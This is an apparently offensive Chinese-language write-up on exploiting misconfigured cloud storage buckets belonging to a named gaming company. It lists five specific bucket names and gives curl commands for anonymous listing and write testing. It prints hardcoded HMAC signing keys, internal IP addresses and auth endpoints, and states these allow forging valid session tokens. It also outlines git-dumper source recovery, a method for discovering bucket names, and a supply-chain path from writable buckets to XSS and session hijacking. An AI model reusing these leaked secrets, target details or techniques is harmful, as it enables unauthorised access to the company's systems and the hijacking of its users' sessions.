# goodluck777 + i17game — GCS/S3 公开桶泄完整源码 + .git + APK

> 目标：IGS 鈊象電子集团 5 个公开云存储桶
> 手法：匿名 GET 列举 → 下载 APK/源码/.git → 逆向提取密钥和内网拓扑
> 成果：233MB APK + Node.js 服务端全量源码 + HMAC 硬编码密钥 + 私有仓库地址

## 云桶匿名列举检测方法

### GCS (Google Cloud Storage)
```bash
# 列举
curl -sS 'https://<bucket>.storage.googleapis.com/' 
# 或通过 CNAME
curl -sS 'https://cdn.target.com/'
# 返回 XML ListBucketResult → IsTruncated=true 需分页
# 分页：?marker=<最后一个Key>

# 写入测试
curl -X PUT 'https://<bucket>.storage.googleapis.com/test.txt' \
  -H 'Content-Type: text/plain' -d 'test'
# 403 = 不可写；200 = 可写（★ 极危）
```

### S3 (AWS)
```bash
curl -sS 'https://<bucket>.s3.amazonaws.com/?max-keys=1000'
# 或区域化
curl -sS 'https://<bucket>.s3.<region>.amazonaws.com/?max-keys=1000'
```

## 实战发现的 5 个桶

| 桶名 | 平台 | 发现方式 | 核弹内容 |
|------|------|---------|---------|
| igspanther-ark | GCS | CDN CNAME | .git仓库 + 233MB APK + NetworkConfig.sc |
| igspanther-test | GCS | CDN CNAME | 测试环境资产 |
| i17game | S3 | APK IL2CPP strings | **服务端 Node.js 全量源码** + HMAC 密钥 |
| igs-horse | S3 ap-southeast-1 | APK IL2CPP strings | 兄弟产品 |
| igstapirus-prod | GCS | APK IL2CPP strings | tapirus 游戏资产 |

## 典型泄露内容及利用价值

### .git 仓库
```
.git/config → 私有仓库地址（可定向社工/钓鱼）
.git/packed-refs → 分支名暴露业务版图
.git/logs/HEAD → 开发者邮箱和主机名
→ 用 git-dumper 完整还原源码
```

### 服务端源码（HMAC 密钥）
```
i17game.tar → Node.js 全量
  login.js → HMAC-SHA1 密钥 "koalasmarch" / "koalas"
  config.js → 内网 192.168.132.59:4000 / :9000
  service.js → /auth/send_token, /auth/get_token
→ 可自造合法会话 token
```

### APK 内配置
```
login.cfg → Firebase 项目配置
google-services-desktop.json → Firebase API Keys
NetworkConfig.sc → 全部后端环境主机名（含未公开的 STG/DEV）
```

## 桶名发现方法论

1. **CDN CNAME**：`dig cdn.target.com CNAME` → `bucket.storage.googleapis.com`
2. **APK/IPA strings**：`strings classes.dex` / IL2CPP binary → S3/GCS URL
3. **前端 JS bundle**：`grep -oP 's3\.amazonaws\.com/[^"]+' *.js`
4. **DNS 枚举**：`target-prod / target-test / target-dev / target-staging`
5. **证书透明度**：`crt.sh` 查 `*.target.com` 子域 → CDN 域名

## 通用教训

1. **桶匿名列举 = 全部资产公开** — 一个列举漏洞暴露整个桶
2. **APK 是桶名的宝库** — 即使 IL2CPP 编译，字符串仍可提取
3. **同集团多桶** — 发现一个桶后横向搜索同名前缀/后缀变体
4. **写入测试必做** — 可写桶 = 供应链攻击（覆盖 JS/Logo → XSS → Session 劫持）
5. **.git 在桶里** — 不只是 web 根，云存储桶也会有 .git 泄露
